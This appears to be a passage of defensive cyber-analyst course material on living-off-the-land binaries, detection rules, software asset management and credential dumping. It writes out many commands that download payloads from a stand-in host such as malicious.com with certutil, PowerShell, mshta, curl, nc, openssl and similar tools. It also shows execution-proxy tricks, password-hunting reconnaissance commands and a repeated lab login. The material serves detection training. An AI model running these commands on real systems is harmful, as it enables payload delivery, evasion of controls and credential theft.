The following is the syntax for this form of file transfer:

certutil.exe -urlcache -split -f http://www.malicious.com/evil.exe C:\users\public\notevil.exe
﻿

FTP
﻿

FTP is the internet’s legacy form of file transfer, and it continues to work for that purpose.

﻿

The syntax for this transfer is shown below: 

cmd.exe /c "@echo open malicious.com 21>ftp.txt&@echo USER malicious>>ftp.txt&@echo PASS password>>ftp.txt&@echo binary>>ftp.txt&@echo GET /evil.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
﻿

This sequence of commands first writes the following lines to the ftp.txt file:

open malicious.com 21
USER malicious
PASS password
binary
GET /evil.exe
quit
﻿

It then uses that text file as a source of instructions for the native Windows FTP binary, opening a connection to an FTP service hosted by a threat actor and downloading the evil.exe file.

﻿

PowerShell
﻿

If an attacker can access an interactive session or run PowerShell commands, this syntax may be employed to download files.  

﻿

The two types of syntax for this type of file transfer are as follows: 

Invoke-WebRequest -Uri "http://www.malicious.com/evil.exe" -OutFile "C:\Users\Public\notevil.exe"
﻿

(New-Object System.Net.WebClient).DownloadFile("http://www.malicious.com/evil
.exe", "C:\Users\Public\notevil.ex
e")
﻿
--------------------------------------------------

Data Ingress Lab
Download a File with Certutil
﻿

Experience how an attacker may bring their own tools and scripts into the Windows platform using one of the binaries just noted and simple terminal access.

﻿

Workflow


----------------------------------------------------

Code and Command Execution
Code and Command Execution in Windows
﻿

The ability to execute prepared code is important to attackers who desire to remain stealthy. This type of code can take the form of batch scripts containing commands, VBScript or PowerShell scripts that contain more advanced functionality, or even compiled code in the form of a custom executable.

﻿

This can be a necessity for the Operational Environment (OE) if defenders have employed specific forms of mitigation, such as allowlisting certain applications. Attackers may still find a way to execute their own code on a compromised system if any of the approved applications include binaries on the following list:

dllhost

MMC

Msconfig

ExtExport

Mshta

BITSAdmin

Cscript

Wscript

sc

at

schtasks

Explorer

Many of these binaries may execute target files located in Alternate Data Streams (ADS) to hide the files from the casual user. The execution of such targets is a valuable indicator to detect, as it is almost always unusual. 

﻿

ADSs represent a file attribute particular to the New Technology File System (NTFS), which allows data to be included in an alternate location in a file rather than the primary, intuitive location that default programs open and read. The ADS attribute is typically accessed by appending a colon and ADS name after the file name. This type of data storage is discussed in further detail in upcoming lessons.

﻿

dllhost
﻿

The Dynamic Link Library (DLL) Host (dllhost) process is designed to launch one or more Windows OSs or applications. It runs a COM object outside the original process that requested it. If the COM object crashes, only the COM surrogate process crashes with it, rather than the requesting host process. If a developer is not fully confident in the code being loaded for an application, that developer likely employs the COM surrogate to host the code.

﻿

The syntax of this command, when used to load a registered or hijacked COM Server payload, is as follows:

dllhost.exe /Processid:{CLSID}
﻿

A Class Identifier (CLSID) is a 128-bit Globally Unique Identifier (GUID) that is used to create instances of a specific piece of code. The functionality that each CLSID provides may be found in the registry key associated with that CLSID under HKEY_CLASSES_ROOT\CLSID, where each of those keys has a descriptive registry value (Default).

﻿

MMC
﻿

The Microsoft Management Console (MMC) is used to create, save, and open administrative tools, called consoles, which manage the hardware, software, and network components of the Microsoft Windows OS. MMC runs on all client OSs that are currently supported.

﻿

This method of arbitrary execution must be prepared by configuring a snap-in to load a COM custom class (CLSID) that has been added to the registry.

﻿

The syntax of this command, when used to execute a prepared snap-in, is as follows:

mmc.exe -Embedding c:\path\to\target.msc
﻿

Msconfig
﻿

Msconfig, also known as the System Configuration Utility, is a Microsoft utility introduced with Windows 98 and available in all later versions of Windows. It is used to configure how a computer starts and which programs and services load when Windows starts.

﻿

The use of this binary for arbitrary execution requires that a user specially craft a c:\windows\system32\mscfgtlc.xml configuration file, which requires administrator access. This configuration file may look something like the following:

<?xml version=”1.0” ?>
<MSCONFIGTOOLS>
<a NAME="Evil Config Tool" PATH="%windir%\system32\WindowsPowerShell\v1.0\powershell.exe" DEFAULT_OPT="-nop -sta -enc -w 1 RwBlAHQALQBJAHQAZQBtACAAKgA=" ADV_OPT="-command calc.exe"
HELP="Does not do anything malicious"/>
</MSCONFIGTOOLS>
﻿

The syntax of this command, when used to execute a malicious command, is as follows:

Msconfig.exe -5
﻿

The -5 option specifies the Tools tab of the System Configuration Utility.

﻿

ExtExport
﻿

ExtExport is a utility bundled with the application Internet Explorer. It exports ImpExp FF (Import/Export Firefox) records, which are essentially deprecated Internet Explorer settings and bookmarks, to the Windows Registry. It is used as an arbitrary execution vector if an attacker renames a malicious DLL to one of its known DLLs located in the Internet Explorer folder.

﻿

To execute a malicious DLL, load a DLL located in the c:\target folder with one of the following names:

mozcrt19.dll

mozsqlite3.dll

Sqlite.dll

When one of these shared libraries is located in a target folder, the following command achieves arbitrary code execution:

Extexport.exe c:\target foo bar
﻿

Mshta
﻿

Mshta.exe is a Windows-native binary designed to execute Microsoft HTML Application (HTA) files. As its full name implies, Mshta can execute Windows Script Host (WSH) code (VBScript and JScript) embedded within HTML in a network proxy-aware fashion. The WSH is the automation technology that provides the framework and support to enable scripted code to run in the Windows OS. These capabilities make Mshta an appealing vehicle for adversaries to perform proxy execution of arbitrary script code through a trusted, signed utility, making it a reliable technique during both initial and later stages of an infection.

﻿

Adversaries tend to use one of the four methods listed below to leverage Mshta to execute arbitrary VBScript and JScript, though file-based and inline execution are the most common.

Inline via an argument passed in the command line to Mshta.

File-based execution via an HTA file.

COM-based execution for lateral movement.

Calling the RunHTMLApplication export function of mshtml.dll with rundll32.exe as an alternative to mshta.exe.

﻿

This binary needs to be locked down to only allow administrators to execute it if needed at all.

﻿

The following command is the syntax when used to execute a malicious HTA file:

mshta.exe notevil.hta
﻿

This binary can also be used to execute arbitrary VBScript or Javascript code.

mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//www.malicious.com/payload[.]sct"")"))

mshta.exe javascript:a=GetObject("script:https://www.malicious.com/payload.sct").Exec();close();
﻿

Mshta also supports the execution of HTA files embedded in ADS:

mshta.exe "C:\Users\Public\file.txt:file.hta"
﻿

BITSAdmin
﻿

Although BITSAdmin is primarily a tool for uploading or downloading files, it may also be used as an execution vector.

﻿

The following syntax is used to execute a malicious DLL:

bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\users\public\notevil.exe & bitsadmin /SetNotifyCmdLine 1 c:\users\public\notevil.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
﻿

Cscript
﻿

Cscript.exe is a command-line version of the WSH that provides command-line options for setting script properties. With Cscript.exe, scripts can be run by typing the name of a script file at the command prompt.

﻿

The following syntax is used to execute a malicious DLL:

cscript c:\users\public\script.vbs
﻿

Additionally, cscript may run scripts hidden in ADS using the following syntax:

cscript c:\users\public\file.txt:script.vbs
﻿

Wscript
﻿

Wscript.exe is another version of the WSH, with the only noticeable difference being that in the OS, one is flagged as a Windows application (wscript) and the other as a console application (cscript). With Wscript.exe, scripts can be run by entering the name of a script file at the command prompt.

﻿

The following syntax is used to execute a malicious script:

wscript c:\users\public\script.vbs
﻿

Additionally, wscript may run scripts hidden in ADS using the following syntax:

wscript c:\users\public\file.txt:script.vbs
﻿

Explorer
﻿

This process manages the graphical shell component of the Windows OS, which includes the taskbar, Start menu, desktop, file manager, and other OS-wide UI features.

﻿

As both a highly visible and common process in the Windows OS, Windows Explorer is a common target during privilege escalation. Targets include injecting shared library code into Explorer’s memory (MITRE ATT&CK® ID T1055.001 Process Injection: Dynamic-link Library Injection) or spoofing explorer.exe as a parent process of a spawned PowerShell session rather than the malicious Microsoft Office document that a user opens (MITRE ID T1134.004 Access Token Manipulation: Parent PID Spoofing). 

﻿

This technique performs execution of a specified file with the explorer parent process breaking the process tree, which can be used by attackers for defense evasion.

﻿

The syntax of this command, when used to execute a malicious executable, is as follows:

explorer.exe /root,"C:\Users\Public\notevil.exe"
﻿

Workflow

﻿

1. Log in to the ch-edu-1 VM using the following credentials:

----------------------------------------

Detecting Living off the Land in Windows Environments
When threat adversaries employ LOL binaries in Windows environments to conduct MCA, detection is a matter of differentiating this malicious behavior from the normal behavior, which may involve the use of the same binaries for day-to-day operations. 

﻿

This is possible through the establishment of a baseline, which constitutes normal behavior, the writing of detection rules for activities deviating from the baseline, and the integration of an alerting system in the mission partner Security Information and Event Management (SIEM) to enable proper follow-through on anomalous behavior.

﻿

Establishing a Baseline
﻿

All the binaries discussed in this lesson have an intended innocuous proper use. While a few have become fully deprecated and their use should be either blocked or marked highly suspicious, most may be used in everyday user actions, system administrator functions, routine scripts, or background operations supporting other routine or normal behavior.

﻿

It is important to conduct a thorough self-assessment in an operating environment to determine what this normal baseline looks like, particularly from a logging perspective. A best practice is to define a period of collection, collect all logs for that period, and thoroughly analyze the activity collected.

﻿

This baselining process assumes a pre-compromise environment. If a malicious threat actor, especially a highly sophisticated one, has already established access to an enterprise, then this baseline includes the malicious activity with the normal. In the absence of any baseline at all, this is a risk that defenders have to take, as any baseline is better than none. However, during the analysis of normal activity, it is valuable to continue to apply a critical approach to the logs and question whether all logged activity should be considered normal. Non-malicious activity is worth examining because it reveals a vulnerability in standard operating procedures.

﻿

Writing Rules for Anomalous Behavior
﻿

Once the baseline is established, deviations from the baseline must be defined. These are best defined in discrete terms that translate into SIEM queries or Intrusion Detection System (IDS) configurations. These rules or signatures could be written in the query language of the SIEM used by the mission partner, including the following:

Kibana Query Language
Splunk Alert
Elastic Rule
ElastAlert 
Qradar Query
Azure Sentinel Query
ArcSight Rule
Carbon Black Query
However, for longevity and universality, it is best to write the rules in a generic signature format that persists across different security architectures. In this lesson, rules are created in the Sigma format.

﻿

Creating Alerts
﻿

Once the rule or signature is defined, a security application, which can highlight activity meeting the rule, needs to be leveraged to enable defenders in identifying that activity, in order to gain value from it. The alternative is that defenders meticulously analyze logs manually or rerun queries as their memory and time allow. 

﻿

These alternatives are inefficient and lead to malicious activity being overlooked. Additionally, once an alert populates in the system, defenders must have a well-defined standard operating procedure to assess and ignore or elevate the alert. Perfectly written rules and alerts that are improperly handled lead to environments that are as insecure as if the safeguards had never been established.

﻿-------------------------------

 Establishing a Baseline
When detecting anomalous behavior, the initial step is to determine which behavior is normal for a given mission partner environment. This is known as establishing the baseline.

﻿

Define a Period of Collection
﻿

To establish a sufficient amount of activity, the collection of events should occur over the course of an entire business cycle, such as a week. This period should repeat regularly and all significant events, such as software updates, routine administrative scripts, and web application updates, should be included. 

﻿

Set Appropriate Metrics
﻿

Setting practical metrics helps determine and analyze which data points are actually used and the type and frequency of behavior that is occurring in an environment. Useful metrics include the following:

Name and count of executables during process creation.

Name and count of parent processes.

Usernames of users who execute sensitive processes, and their permissions.

Use the Kibana Visualizations dashboard to determine, at a glance, what constitutes normal behavior in the OE. Pay attention particularly to the binaries that are commonly used in LOL attacks.

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!

------------------------------------------

Introduction to Playbook
Playbook is a web application available from the SOC that allows defenders and analysts to create Plays, which are rule-based alerts allowing for seamless integration with a SIEM and a framework for the elevation of alerts, such as theHive.

![image](https://github.com/user-attachments/assets/4115e94f-9542-48c8-bdc2-e17e6894a424)

Creating a Detection Playbook 


The individual Plays in Playbook are self-contained; they are not dependent on each other to perform correctly. Each Play consists of the following:
Objective and Context: Specific activity to detect.
Follow-up Actions: Steps to validate and/or remediate any alerts produced by the play.
Query: Syntax of the SIEM query (such as the Elasticsearch configuration) that implements the Play’s objective. 
Risk Level: Severity of the alert. It can be Critical, High, Medium, or Low.

----------------------------------

Sigma Rules
Introduction to Sigma Rules
﻿

Plays have adopted the Sigma Rule format as a standard for configuring the signature by which queries are created. According to the creators,

﻿

"Sigma is a generic and open signature format that allows you to describe relevant log events in a straightforward manner. The rule format is very flexible, easy to write, and applicable to any type of log file. The main purpose of this project is to provide a structured form in which researchers or analysts can describe their once-developed detection methods and make them shareable with others. Sigma is for log files what Snort is for network traffic and YARA is for files."

﻿

Attributes of a Sigma Rule
﻿

The Sigma Rule is written in the following Yet Another Markup Language (YAML) format:

title: Whoami Execution
id: e28a5a99-da44-436d-b7a0-2afc20a5f413
status: test
description: Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation but rarely used by administrators
author: Florian Roth
references:
  - 
https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/
  - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/
date: 2018/08/13
modified: 2021/11/27
logsource:
  category: process_creation
  product: windows
  Service: sysmon
detection:
  selection:
    Image|endswith: '\whoami.exe'
  condition: selection
falsepositives:
  - Admin activity
  - Scripts and administrative tools used in the monitored environment
  - Monitoring activity
level: medium
tags:
  - attack.discovery
  - attack.t1033
  - 
car.2016-03-001
﻿

This rule is included in the official Sigma repository and is a product of one of its creators, Florian Roth.

﻿

Title
﻿

A helpful and descriptive name for the rule.

﻿

ID
﻿

A GUID that is unique to the rule. These are determined by SigmaHQ.

﻿

Status
﻿

The available statuses are Test, Experimental, and Published and are based on the level of development.

﻿

Author
﻿

Refers to the researcher or developer who created the rule. Although not essential to its execution, this field is respectful to include in order to give the author credit. It also informs the maintainer of the rule base which repositories to return to for updates.

﻿

References
﻿

Helpful links that led to the development of the rule.

﻿

Date
﻿

Refers to the rule’s original creation.

﻿

Modified
﻿

Helpful metric of the rule’s practicality. It shows when the rule was last altered, which gives insight into how recently the rule was reviewed and updated to reflect the most recent research and tradecraft. For rules maintained by authors within an organization, this date indicates when the rule was last reviewed and compared to the organizational baseline.

﻿

Logsource
﻿

The sub-fields for this field tell the Sigma conversion tool which indexes to search on and how to refine the search on certain log sources, such as Sysmon.

﻿

For the rule above, the Playbook backend would use this information to query the correct product, such as Windows Sysmon, and narrow down the type of log; in this case, the category Process Creation refers to Sysmon Event ID 1 logs.

﻿

Detection
﻿

Defines a number of sub-fields, which are known as selectors, and a condition sub-field. The selectors define SIEM search parameters, or portions of parameters, that are unique to the behavior that this rule is attempting to detect. These are commonly executable names, parent process names, command-line arguments, folder names, and specific domains or addresses.

﻿

The selectors may be named anything, as long as they are used consistently. It is a good practice to name them in a way that improves readability. 

﻿

The most important sub-field here is the Condition field. It is the logic that determines whether the rule works or not. The format of this field varies from rule to rule. On certain rules, the selectors are simple, and the condition line is true if the selector exists at all.

condition: selector1
﻿

In other cases, the condition could become more complicated as variations of the behavior, files, or commands develop. 

condition: (selector1 and selector2) or (selector1 and selector3) or selector4
FalsePositives
﻿

Provides defenders and response teams information about what non-malicious activity may have triggered the rule. These queues provide an important starting point for the investigation broken into corresponding alerts and refinements of the rules if too many false positives occur.

﻿

Level
﻿

Criticality of the alert if the activity indicates a true positive. Criticality is determined in the management function Risk Assessment and informed by industry standards, such as the Common Vulnerability Scoring System (CVSS) score of disclosed vulnerabilities.

﻿

Tags
﻿

Help in searching and cataloging the rules easily.

﻿----------------------------------

 Creating Playbook Alerts
Use the syntax of the completed example rule located at C:\Users\trainee\Documents\bitsadmin.yml for creating the following alert.

﻿

Follow these steps to create a Playbook alert in the web interface without a prescribed template. When using this interface to configure alerting, this procedure is repeated many times. More than 500 Plays are already configured in Security Onion, but when those are insufficient to cover current needs or when one needs to be modified, it is important to understand how to create one.

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!

-----------------------------------------------

Linux Binaries for Multiple Functions
LOL in Linux most commonly involves utilizing scripting engines already installed by default in almost every distribution of the OS, including the following:

Bash
Python
Ruby
Perl
Lua
Other user and system administrator commands
Bash
﻿

This scripting engine is unique in that it is a very common shell that users enter when accessing the Linux system terminal. Its multiphase aspect in LOL is that the scripts that run commands and are created in a certain programmatic format are useful in all phases.

﻿

Scripting Languages
﻿

All the scripting languages mentioned can perform very similar functions, although Python tends to be the most ubiquitous and accessible in target systems. The most important part of understanding how attackers can leverage these engines is knowing which binaries in an environment are compiled with support for one of these languages. Anything that can be done by the Python binary natively, for example, can be done by any binary compiled to support it, as GDB (GNU Debugger) often is. Even if a user is running in a shell restricted from executing the native Python binary, allowing access to a utility such as GDB still allows the execution of Python code through the GDB flag -ex (execute), but this requires that it was configured using the flag --with-python prior to compilation.

﻿-------------------

 Initial Situational Awareness and Reconnaissance
Local Enumeration Binaries
﻿

There are a number of common everyday commands that are used during initial reconnaissance of a Linux OS, such as ls (directory listing), cat (reading a file to standard output), and find (file search). Therefore, detection of such rules often has to center around the specific syntax and arguments of commands that are more likely to be run in an enumeration context than a normal operation context. Again, referring to a baseline of normal operations is essential to building this profile.

﻿

Additionally, as in Windows reconnaissance, although the presence of innocent commands is not suspicious by itself, the sequence of many such commands performed in short succession may indicate the running of a reconnaissance script.

﻿

Commands that are run during reconnaissance but not unique to it include the following. These commands should be familiar from previous lessons about Linux-based reconnaissance.

pwd

ls

cat /proc/version

hostnamectl

hostname

set

env

ip a

ifconfig

netstat -antp

ss -tulpn

systemctl --type=service --state=running

Commands that are unique to reconnaissance include the following. These are unlikely to be run by normal users during normal operations.

sudo -l: Lists the commands that the current user may run with superuser privileges.

find / -perm -u=s -type f 2>/dev/null: Attempts to find all binaries on a system that may be run with another user’s privileges, which is known as a Set User Identification (SUID) binary. These types of binaries are highly sought after and considered valuable to an attacker if not precisely scoped, as they have the potential to grant attackers higher privileges than an initial compromise often grants.

ps -AF e | grep root: Lists all processes running on a system and filters by those running under the root user context.

strings /dev/mem -n10 | grep -i PASS: Searches for strings in memory likely to contain passwords.

mount; df -h; cat /etc/fstab: Lists all mounted filesystems.

find / 2>/dev/null | grep password: Attempts to find files on the system with password in the filename.

Workflow

﻿

1. Log in to the ch-dev-cent VM using the following credentials:

-----------------------------

Data Ingress and Egress in Linux
The ability to ingress (bring into an environment) additional tools and scripts is essential for many threat actors, and doing so with capabilities already in the target environment allows for the development of a campaign without burning valuable tools, such as implants. The following binaries, which preexist in the Linux OS, may be used for this function:

Curl

Wget

Nc/ncat

Openssl

FTP/SFTP/TFTP

Socat

Smbclient

Finger

Ssh

Curl
﻿

Curl is used in command lines or scripts to transfer data using common protocols, including HTTP and HTTPS. Curl is also frequently included in the embedded OSs of cars, television sets, routers, printers, audio equipment, mobile phones, tablets, and media players and is the internet transfer engine for thousands of software applications.

﻿

When used to ingress a file, the syntax of this command is as follows:

curl http://www.maliciou.com/evil_file -o notevil_file
﻿

wget
﻿

Wget is a non-interactive command-line application for retrieving files using HTTP, HTTPS, FTP, and FTPS protocols. It is easily called from scripts, cron jobs, or terminals without X-Windows support.

﻿

When used to ingress a file, the syntax of this command is as follows:

wget http://www.maliciou.com/evil_file -o notevil_file
nc/ncat/netcat
﻿

These programs are often known as the Swiss Army knives of network service interaction and traffic redirection. They are highly versatile in sending and receiving a variety of data streams but are limited to one destination port and address at a time. 

﻿

This sort of ingress must be prepared on the remote system by executing a command such as the following:

nc -lp 12345 < ./evil_file
﻿

The syntax of this command, when used to ingress a file to an intended destination, is as follows:

nc www.malicious.com 12345 > notevil_file
﻿

openssl
﻿

Openssl is an implementation of the Secure Sockets Layer (SSL) and Transport Layer Security (TLS) libraries, and the binary contains many functions for file transfer, remote communication, and library loading.

﻿

This sort of ingress must be prepared on the attacker’s end by executing a command to set up a server to receive files:

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < evil_file
﻿

When used to ingress a file, the syntax of this command is as follows:

openssl s_client -quiet -connect www.malicious.com:12345 > notevil_file
﻿

FTP/SFTP/TFTP
﻿

FTP is the original file transfer protocol of the internet, though it has been built on to produce other protocols and the applications that interact with services running those protocols.

﻿

Both SFTP/FTPS and TFTP are file transfer protocols but with key differences. SFTP/FTPS builds on the capabilities of plain FTP and enhances security. On the other hand, TFTP is a stripped-down transfer protocol that can only be used to send and receive files. It contains none of the management and editing capabilities of FTP. It does not allow a user to list, delete, rename, or change directories, and it is commonly used in cases where the user knows the exact file, precise location, and does not require any security or encryption when sending or receiving that file.

﻿

In each case, the attacker must be running a server that serves the files over the necessary protocol.

﻿

When used to ingress a file, the syntax of these binaries is as follows:

ftp www.malicious.com
get evil_file
sftp www.malicious.com
get evil_file notevil_file
tftp www.malicious.com
get evil_file
﻿

socat
﻿

Like Netcat, socat is known as a network Swiss Army knife. It differs in syntax and in providing advanced functionality, such as allowing multiple clients to listen on a port and reusing connections.

﻿

This sort of ingress must initially be prepared on the attacker’s end by executing the following command:

socat -u file:evil_file tcp-listen:12345,reuseaddr
﻿

When used to ingress a file, the syntax of this command is as follows:

socat -u tcp-connect:www.malicious.com:12345 open:notevil_file,creat
﻿

smbclient
﻿

Smbclient is a client that can talk to a Server Message Block (SMB)/Common Internet File System (CIFS) server. It offers an interface similar to that of the FTP program. Operations include transferring files from the server to the local machine, moving files from the local machine to the server, retrieving directory information from the server, and so on.

﻿

In this case, the attacker needs to set up an SMB share to host the file being served to the target system.

﻿

When used to ingress a file, the syntax of this command is as follows:

smbclient '\\www.malicious.com\share' -c 'get evil_file notevil_file'
﻿

finger
﻿

Finger is a networking tool and one of the earliest computer networking programs that enabled a user to view another user’s basic information when accessing the same computer system or logged on to the same network. The program can determine user identity through an email address and determine whether that user is currently logged in as well as the status of their log sessions.

﻿

For this form of file ingress, the attacker needs to serve a Base64-encoded file to the default finger port 79. Any network traffic using this protocol should be regarded as suspicious, as it has been deprecated for some time.

﻿

The syntax of this command, when used to ingress a file, is as follows:

finger x@www.malicious.com | base64 -d > "$LFILE"
﻿

ssh/scp
﻿

When an attacker has Secure Shell (SSH) access to a target machine, the process of ingressing files becomes extremely easy, as this functionality is already built into the SSH service. This can even be initiated from the attacker’s side, though the transfer is logged in SSH logs. Secure Copy (SCP) is a utility bundled with the SSH ecosystem that is designed for file transfer.

﻿

The syntax of this command, when used to ingress a file from the attacker side, is as follows:

scp ./evil_file user@target_address:~/notevil_file
﻿

The syntax of this command, when used to ingress a file from the target side, if the attacker has the SSH service running, is as follows:

scp user@www.malicious.com:~/evil_file ./notevil_file 
﻿

This second method is a poor choice from an attacker’s operational security perspective, as it leaves at least a username on the attacker’s machine in the logs and command history.

﻿

Using this knowledge, experience how an attacker may bring their own tools and scripts into the Linux platform using one of these binaries and simple terminal access.

﻿

Workflow

﻿

1. Log in to the ch-dev-cent VM using the following credentials:

Username: trainee
Password: CyberTraining1!

-------------------------------------------

Loading Shared Libraries
Like in Windows machines, being able to run pre-compiled code or scripts in a target environment saves attackers incredible amounts of time and improves functionality during a campaign. Additionally, in the case of staged malware, this prepared code is essential to loading following stages, the final stage of which may often be a complex binary. Using binaries such as the following to load shared libraries may help attackers circumvent application allowlisting and make one more stage of an attack more difficult to signature.

Openssl
Python 
Ruby 
Openssl
﻿

Openssl can also be used to execute code by loading a shared library with the following command syntax:

openssl req -engine ./lib.so
﻿

Python
﻿

Python was previously detailed. It is installed on most Linux distributions by default. When present, it can enable the loading of any arbitrary shared library.

﻿

This technique works for both the native Python binary and any application compiled with Python support, such as GDB.

python -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
﻿

Ruby
﻿

Although slightly less ubiquitous than Python, Ruby is also installed on many Linux distributions. Like Python, Ruby and any applications compiled to support Ruby code also enable arbitrary library loads.

ruby -e 'require "foo"; foo.dlopen("lib.so")'


![image](https://github.com/user-attachments/assets/5f739c28-2daa-4e4d-86ed-0fc3f7022481)


-----------------------------

Software Asset Management
Software Asset Management refers to the policies that restrict user execution of software on domain information systems. It can also include a profile of which software is or may be installed on information systems. The best policies are tailored to the organization’s baseline of normal activity and appropriate user roles and permissions.

﻿

Blocklisting and Allowlisting
﻿

Application allowlisting technologies (also known as whitelisting) are used to stop the execution of malware and other unauthorized processes. In many ways, application allowlisting is the opposite of security technologies like antivirus, which use blocklists to block known–bad activity and permit all others. 

﻿

According to National Institute of Standards and Technology (NIST) Special Publication (SP) 800-167, Guide to Application Whitelisting: 

﻿

"An application whitelist is a list of applications and application components (libraries, configuration files, etc.) that are authorized to be present or active on a host according to a well-defined baseline. The technologies used to enforce application whitelists—to control which applications are permitted to be installed or executed on a host—are called whitelisting programs, application control programs, or application whitelisting technologies."

﻿

Blocklisting, or denylisting, by contrast, is compiling a list of applications that have been associated with malicious activity and denying users execution access to files with those names. However, in comparison to allowlisting, blocklisting provides diminishing returns the larger a list becomes, as new malicious binaries are developed every day, and they frequently change names, even while maintaining the same signature. Conversely, the list of approved applications may not need to be allowlisted across the board. It is useful, especially in limited adversary reconnaissance and enumeration options, to make certain binaries, such as WMIC, PowerShell, systeminfo, and any tools from the Sysinternals suite, available to administrators only.

﻿

PowerShell Security
﻿

PowerShell should be configured to enforce a strict Execution Policy, logging of executed commands and modules, and Application Control.

﻿

Execution Policy
﻿

PowerShell's execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts. This feature helps prevent the execution of malicious scripts.

﻿

The execution policy may be set to any of the following:

AllSigned

Bypass

Default

RemoteSigned

Restricted

Undefined

Unrestricted

In most OEs, the Windows default setting, Restricted, allows commands, but not scripts, to be run. This is a reasonable setting for any users who require PowerShell for normal operations. Administrators who regularly utilize signed scripts in their operations may request to have the AllSigned execution policy set for their accounts, which is more expansive and risks the running of signed malicious scripts. The Bypass execution policy mode permits scripts to run without restrictions while maintaining a basic level of security awareness, such as prompting a user. The Unrestricted mode completely removes all restrictions on script execution, posing a higher security risk by allowing potentially malicious scripts to execute without notice.﻿

﻿

Logging
﻿

Module logging allows you to enable logging for selected PowerShell modules. This setting is effective in all sessions on the computer. Pipeline execution events for the specified modules are recorded in the Windows PowerShell log in Event Viewer.

﻿

Script block logging enables logging for the processing of commands, script blocks, functions, and scripts — whether invoked interactively or through automation. This information is logged to the Microsoft-Windows-PowerShell/Operational event log.

﻿

These types of logging, and how to configure them, were discussed in the CDA-B lesson Windows Event Logs.

﻿

Application Control
﻿

Implemented through Windows Defender Application Control or AppLocker, this security control is the Windows implementation of allowlisting and enables the creation of rules to allow or deny applications from running based on unique identities of files and to specify which users or groups can run those applications. 

 

Restricted Shells
﻿

The restricted shell is a Linux shell that restricts the capabilities available to an interactive user session, or to a shell script, running within it. It is intended to provide an additional layer of security but is insufficient to allow the execution of entirely untrusted software. In certain cases, a restricted shell is used in conjunction with a chroot jail, which changes the apparent root directory for the current user, in a further attempt to limit access to the system as a whole. A chroot jail is helpful in restricting access to folders outside the modified environment and is common in docker containers.

﻿

These shells, such as rbash, can be configured for a user at creation or through modification commands performed by a superuser. The commands and directories available to such a restricted user may be configured in that user’s bash_profile. 

﻿---------------------------

Implementing Software Asset Management
Managing PowerShell Software Permissions
﻿

An administrator recently reported that they were able to run a PowerShell script that had just been downloaded from the internet with no restrictions. It is imperative to enforce a secure script execution policy across the domain to mitigate this vulnerability. This type of enforcement is executed well with Group Policy Objects (GPO). Follow the steps to harden the mission partner’s domain against the running of malicious scripts. 

﻿

Workflow

﻿

1. Log in to the ch-dc1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!


---------------------------------

Identifying Plaintext Credentials 
Walk through an example of identifying a plaintext credential storage location for a Simple Mail Transfer Protocol (SMTP).

﻿

Workflow

﻿

1. Log in to the ch-tech-1 Virtual Machine (VM) using the following credentials:

﻿

Username: trainee
Password: CyberTraining1!
﻿

2. Open Sublime Text 3:

﻿

﻿

﻿

3. Select File > Open File..., and open smtp.settings:

C:\Users\trainee\AppData\Roaming\smtp\smtp.settings
﻿

NOTE: The AppData folder is normally hidden by default.

﻿

The smtp.settings is an example configuration file for an SMTP client to communicate with an SMTP server. The configuration defines the SMTP host, port, protocol, username, and password. If not stored properly, a configuration file, such as the SMTP file, can become an easy target for adversaries looking to dump credentials and perform lateral movement. 

![image](https://github.com/user-attachments/assets/cf594e4a-03a2-4ca0-9078-d4106b86557d)

![image](https://github.com/user-attachments/assets/882522d0-3409-4d59-9ab4-6e27b0e737cc)

-----------------------------

#### CDAH-M9L2-Dumping Credentials ####

Credential Dumping Overview
Once the adversary has established a presence on a particular host, the next step to advance the campaign is often to identify and leverage credentials that are exposed by the user or the compromised host — commonly called credential dumping. Credentials contain usernames and passwords and are used to access additional services, systems, and devices. Credential dumping refers to deriving credential information from an Operating System (OS), software, or files. According to MITRE ATT&CK, Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform lateral movement and access restricted information. 

﻿

Lateral Movement
﻿

A primary objective of credential dumping is to perform lateral movement on the infiltrated system. According to MITRE ATT&CK, lateral movement refers to the techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish lateral movement or use legitimate credentials with native network and operating system tools, which may be stealthier. Lateral movement is a large aspect of the Cyber Defense Analyst-Host (CDA-Host) course and is covered in-depth in a following lesson. 

﻿

A rewarding target for the adversary is credential system stores. Local file systems and remote file shares can contain credential information. The systems and stores can be insecurely configured to store credentials in plaintext. Credentials saved in plaintext appear exactly as they are written down with no encryption or hashes. A troubling effect of storing credential information in plaintext is the potential reuse of the credential information in other systems. Often users insecurely reuse credential information, meaning that the adversary can immediately leverage stolen credentials to potentially access other systems. Additionally, some applications store credentials insecurely in configuration or setting files, which can also be leveraged by the adversary. 

--------------------------

Identifying Plaintext Credentials 
Walk through an example of identifying a plaintext credential storage location for a Simple Mail Transfer Protocol (SMTP).

﻿

Workflow

-----------------------

Encrypting Credentials with PowerShell
PowerShell has the capability to work with several objects related to credentials: SecureString, String, and PSCredential. A SecureString is a special type of string that contains either an encrypted string from a user's input or a plaintext string that is converted to an encrypted string. A SecureString is only held in memory and cannot be saved in a file or in the registry. In order for that to take place, a SecureString must be converted into an encrypted String. SecureStrings use reversible encryption on a per-user basis. The PSCredential object contains a plaintext login username and the encrypted password as a SecureString. The following lab demonstrates the process to create SecureStrings, encrypted Strings, and PSCredential objects.

﻿

Workflow

------------------------------

Credential Dumping Techniques | Compromised Host 
